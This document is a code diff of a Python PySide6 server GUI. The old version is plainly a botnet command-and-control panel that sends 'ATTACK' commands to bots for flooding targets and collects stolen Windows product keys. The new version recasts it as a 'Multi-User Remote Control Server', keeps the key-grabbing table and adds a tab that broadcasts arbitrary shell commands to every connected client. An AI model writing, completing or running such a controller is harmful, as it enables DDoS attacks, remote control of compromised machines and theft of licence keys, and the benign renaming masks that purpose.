@@ -1,220 +1,166 @@
 import sys
 import socket
 import threading
-import time
-import requests
-import logging
 from PySide6.QtWidgets import (
-    QApplication, QMainWindow, QTableWidget, QTableWidgetItem,
-    QVBoxLayout, QWidget, QPushButton, QLabel, QLineEdit, QTabWidget
+    QApplication, QMainWindow, QTableWidget, QTableWidgetItem, QTabWidget,
+    QVBoxLayout, QWidget, QPushButton, QTextEdit
 )
+from PySide6.QtCore import Qt
 
-# Setup logging
-logging.basicConfig(
-    level=logging.DEBUG,
-    format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[
-        logging.FileHandler("cnc_server.log"),
-        logging.StreamHandler()
-    ]
-)
 
-class CnCServer(QMainWindow):
+class Server(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("C&C Server")
+        self.setWindowTitle("Multi-User Remote Control Server")
         self.setGeometry(100, 100, 800, 600)
 
-        # Tabs
         self.tabs = QTabWidget()
-        self.menu_tab = QWidget()
-        self.grabber_tab = QWidget()
-        self.tabs.addTab(self.menu_tab, "Menu")
-        self.tabs.addTab(self.grabber_tab, "Grabber")
         self.setCentralWidget(self.tabs)
 
-        self.bots_table = None
-        self.grabber_table = None
+        # Tabs
+        self.clients_tab = QWidget()
+        self.menu_tab = QWidget()
+        self.shell_tab = QWidget()
+        self.wks_tab = QWidget()
+
+        # Add tabs to the main widget
+        self.tabs.addTab(self.clients_tab, "Clients")
+        self.tabs.addTab(self.menu_tab, "Menu")
+        self.tabs.addTab(self.shell_tab, "Shell")
+        self.tabs.addTab(self.wks_tab, "WKs")
+
+        # Initialize UI for each tab
+        self.clients_ui()
+        self.menu_ui()
+        self.shell_ui()
+        self.wks_ui()
+
+        # Networking
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.bots = {}  # Dictionary to store bot info (IP, status, country, OS)
+        self.server_socket.bind(("0.0.0.0", 9999))  # Bind to all available interfaces
+        self.server_socket.listen(5)  # Allow up to 5 simultaneous connections
+        self.clients = {}  # {addr: socket}
 
-        self.setup_menu_tab()
-        self.setup_grabber_tab()
-        threading.Thread(target=self.start_server).start()
+        threading.Thread(target=self.accept_clients, daemon=True).start()
 
-    def setup_menu_tab(self):
+    def clients_ui(self):
         layout = QVBoxLayout()
+        self.clients_table = QTableWidget()
+        self.clients_table.setColumnCount(1)
+        self.clients_table.setHorizontalHeaderLabels(["Clients (IP)"])
+        layout.addWidget(self.clients_table)
+        self.clients_tab.setLayout(layout)
+
+    def menu_ui(self):
+        layout = QVBoxLayout()
+        self.menu_table = QTableWidget()
+        self.menu_table.setColumnCount(4)
+        self.menu_table.setHorizontalHeaderLabels(["Client", "OS", "Upload Speed (KB/s)", "Download Speed (KB/s)"])
+        layout.addWidget(self.menu_table)
         self.menu_tab.setLayout(layout)
 
-        # Table for bots
-        self.bots_table = QTableWidget(0, 4)
-        self.bots_table.setHorizontalHeaderLabels(
-            ["Bots Online", "Status", "Country", "OS"]
-        )
-        layout.addWidget(self.bots_table)
-
-        # Form for attack parameters
-        self.target_label = QLabel("Target:")
-        self.target_input = QLineEdit()
-        self.port_label = QLabel("Port:")
-        self.port_input = QLineEdit("80")
-        self.delay_label = QLabel("Delay:")
-        self.delay_input = QLineEdit("0")
-
-        layout.addWidget(self.target_label)
-        layout.addWidget(self.target_input)
-        layout.addWidget(self.port_label)
-        layout.addWidget(self.port_input)
-        layout.addWidget(self.delay_label)
-        layout.addWidget(self.delay_input)
-
-        # Buttons
-        self.start_button = QPushButton("Start Attack")
-        self.stop_button = QPushButton("Stop Attack")
-        layout.addWidget(self.start_button)
-        layout.addWidget(self.stop_button)
-
-        self.start_button.clicked.connect(self.start_attack)
-        self.stop_button.clicked.connect(self.stop_attack)
-
-    def setup_grabber_tab(self):
+    def shell_ui(self):
         layout = QVBoxLayout()
-        self.grabber_tab.setLayout(layout)
+        self.shell_output = QTextEdit()
+        self.shell_output.setReadOnly(True)
+        layout.addWidget(self.shell_output)
 
-        # Table for grabber
-        self.grabber_table = QTableWidget(0, 2)
-        self.grabber_table.setHorizontalHeaderLabels(["Windows Key", "Bot"])
-        layout.addWidget(self.grabber_table)
+        self.shell_input = QTextEdit()
+        self.shell_input.setPlaceholderText("Enter shell command here...")
+        layout.addWidget(self.shell_input)
 
-    def start_server(self):
-        try:
-            self.server_socket.bind(("0.0.0.0", 12345))
-            self.server_socket.listen(5)
-            logging.info("C&C server started on port 12345")
-            while True:
-                client_socket, client_address = self.server_socket.accept()
-                logging.info(f"Bot connected: {client_address}")
-                threading.Thread(target=self.handle_bot, args=(client_socket, client_address)).start()
-        except Exception as e:
-            logging.error(f"Error starting server: {e}")
+        self.execute_shell_button = QPushButton("Execute Command")
+        self.execute_shell_button.clicked.connect(self.execute_shell_command)
+        layout.addWidget(self.execute_shell_button)
 
-    def handle_bot(self, client_socket, client_address):
-        ip = client_address[0]
-        self.add_bot(ip, client_socket)
+        self.shell_tab.setLayout(layout)
 
-        try:
-            while True:
-                message = client_socket.recv(1024).decode()
-                logging.debug(f"Message from {ip}: {message}")
-                if message == "PONG":
-                    self.update_bot_status(ip, "Idle")
-                elif message.startswith("OS:"):
-                    os_info = message.split(":", 1)[1]
-                    self.update_bot_os(ip, os_info)
-                elif message.startswith("KEY:"):
-                    windows_key = message.split(":", 1)[1]
-                    self.add_to_grabber_table(windows_key, ip)
-        except socket.error:
-            logging.warning(f"Bot {ip} disconnected")
-            self.remove_bot(ip)
+    def wks_ui(self):
+        layout = QVBoxLayout()
+        self.wks_table = QTableWidget()
+        self.wks_table.setColumnCount(2)
+        self.wks_table.setHorizontalHeaderLabels(["Client", "Windows Key"])
+        layout.addWidget(self.wks_table)
+        self.wks_tab.setLayout(layout)
 
-    def add_bot(self, ip, client_socket):
-        row_position = self.bots_table.rowCount()
-        self.bots_table.insertRow(row_position)
-
-        self.bots_table.setItem(row_position, 0, QTableWidgetItem(ip))
-        self.bots_table.setItem(row_position, 1, QTableWidgetItem("Waiting for pong..."))
-        self.bots_table.setItem(row_position, 2, QTableWidgetItem(self.get_country(ip)))
-        self.bots_table.setItem(row_position, 3, QTableWidgetItem("Unknown"))
-
-        self.bots[ip] = {"row": row_position, "socket": client_socket, "status": "Waiting for pong..."}
-        logging.info(f"Bot {ip} added to the table")
-        threading.Thread(target=self.ping_bot, args=(ip, client_socket)).start()
-
-    def remove_bot(self, ip):
-        if ip in self.bots:
-            row = self.bots[ip]["row"]
-            self.bots_table.removeRow(row)
-            del self.bots[ip]
-            logging.info(f"Bot {ip} removed from the table")
-
-    def update_bot_status(self, ip, status):
-        if ip in self.bots:
-            row = self.bots[ip]["row"]
-            self.bots_table.setItem(row, 1, QTableWidgetItem(status))
-            self.bots[ip]["status"] = status
-            logging.info(f"Status of {ip} updated to {status}")
-
-    def update_bot_os(self, ip, os_info):
-        if ip in self.bots:
-            row = self.bots[ip]["row"]
-            self.bots_table.setItem(row, 3, QTableWidgetItem(os_info))
-            logging.info(f"OS of {ip} updated to {os_info}")
-
-    def ping_bot(self, ip, client_socket):
+    def accept_clients(self):
         while True:
-            try:
-                client_socket.sendall("PING".encode())
-                time.sleep(10)
-                if self.bots[ip]["status"] == "Waiting for pong...":
-                    logging.warning(f"Bot {ip} did not respond to ping, removing from table")
-                    self.remove_bot(ip)
-                    break
-            except socket.error:
-                logging.error(f"Error pinging bot {ip}, removing from table")
-                self.remove_bot(ip)
+            client_socket, addr = self.server_socket.accept()
+            self.clients[addr[0]] = client_socket
+            self.update_clients_table(addr[0])
+            threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True).start()
+
+    def update_clients_table(self, client_ip):
+        row = self.clients_table.rowCount()
+        self.clients_table.insertRow(row)
+        self.clients_table.setItem(row, 0, QTableWidgetItem(client_ip))
+
+    def handle_client(self, client_socket, addr):
+        try:
+            while True:
+                data = client_socket.recv(1024).decode()
+                if data.startswith("OS: "):
+                    self.update_menu_table(addr[0], data[4:], 0, 0)  # Initial speed is 0 KB/s
+                elif data.startswith("Speed: "):
+                    # Parse speed data
+                    speed_data = data.split("Speed: ")[1]
+                    upload_speed, download_speed = map(float, speed_data.replace(" KB/s", "").split(","))
+                    self.update_menu_table(addr[0], None, upload_speed, download_speed)
+                elif data.startswith("Windows Key: "):
+                    self.update_wks_table(addr[0], data[13:])
+                else:
+                    self.update_shell_output(f"[{addr[0]}]: {data}")
+        except Exception as e:
+            print(f"[ERROR] Client {addr[0]} disconnected: {e}")
+            del self.clients[addr[0]]
+
+    def update_menu_table(self, client_ip, os_info=None, upload_speed=None, download_speed=None):
+        # Find the row for this client
+        row = None
+        for i in range(self.menu_table.rowCount()):
+            if self.menu_table.item(i, 0).text() == client_ip:
+                row = i
                 break
 
-    def get_country(self, ip):
-        try:
-            response = requests.get(f"http://ipinfo.io/{ip}/country")
-            if response.ok:
-                country = response.text.strip()
-                logging.info(f"Country for {ip}: {country}")
-                return country
-            else:
-                logging.warning(f"Failed to get country for {ip}")
-                return "Unknown"
-        except Exception as e:
-            logging.error(f"Error getting country for {ip}: {e}")
-            return "Unknown"
+        # If the client is new, add a row
+        if row is None:
+            row = self.menu_table.rowCount()
+            self.menu_table.insertRow(row)
+            self.menu_table.setItem(row, 0, QTableWidgetItem(client_ip))
 
-    def start_attack(self):
-        target = self.target_input.text()
-        port = self.port_input.text()
-        delay = self.delay_input.text()
+        # Update OS info if provided
+        if os_info:
+            self.menu_table.setItem(row, 1, QTableWidgetItem(os_info))
 
-        for ip, bot in self.bots.items():
-            try:
-                command = f"ATTACK {target} {port} {delay}"
-                bot["socket"].sendall(command.encode())
-                self.update_bot_status(ip, "Attacking")
-                logging.info(f"Attack command sent to {ip} with target {target}:{port}, delay {delay}")
-            except socket.error:
-                logging.error(f"Failed to send attack command to {ip}")
-                self.remove_bot(ip)
+        # Update upload and download speeds
+        if upload_speed is not None:
+            self.menu_table.setItem(row, 2, QTableWidgetItem(f"{upload_speed:.2f} KB/s"))
+        if download_speed is not None:
+            self.menu_table.setItem(row, 3, QTableWidgetItem(f"{download_speed:.2f} KB/s"))
 
-    def stop_attack(self):
-        for ip, bot in self.bots.items():
-            try:
-                bot["socket"].sendall("STOP".encode())
-                self.update_bot_status(ip, "Idle")
-                logging.info(f"Stop command sent to {ip}")
-            except socket.error:
-                logging.error(f"Failed to send stop command to {ip}")
-                self.remove_bot(ip)
+    def update_wks_table(self, client_ip, windows_key):
+        row = self.wks_table.rowCount()
+        self.wks_table.insertRow(row)
+        self.wks_table.setItem(row, 0, QTableWidgetItem(client_ip))
+        self.wks_table.setItem(row, 1, QTableWidgetItem(windows_key))
 
-    def add_to_grabber_table(self, windows_key, ip):
-        row_position = self.grabber_table.rowCount()
-        self.grabber_table.insertRow(row_position)
+    def update_shell_output(self, text):
+        self.shell_output.append(text)
 
-        self.grabber_table.setItem(row_position, 0, QTableWidgetItem(windows_key))
-        self.grabber_table.setItem(row_position, 1, QTableWidgetItem(ip))
-        logging.info(f"Windows key {windows_key} added to grabber table for bot {ip}")
+    def execute_shell_command(self):
+        command = self.shell_input.toPlainText()
+        self.shell_input.clear()
+        # Send the shell command to all connected clients
+        if self.clients:
+            for client_ip, client_socket in self.clients.items():
+                try:
+                    client_socket.send(f"shell:{command}".encode())
+                except Exception as e:
+                    print(f"[ERROR] Could not send command to {client_ip}: {e}")
 
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
-    window = CnCServer()
-    window.show()
+    server = Server()
+    server.show()
     sys.exit(app.exec())
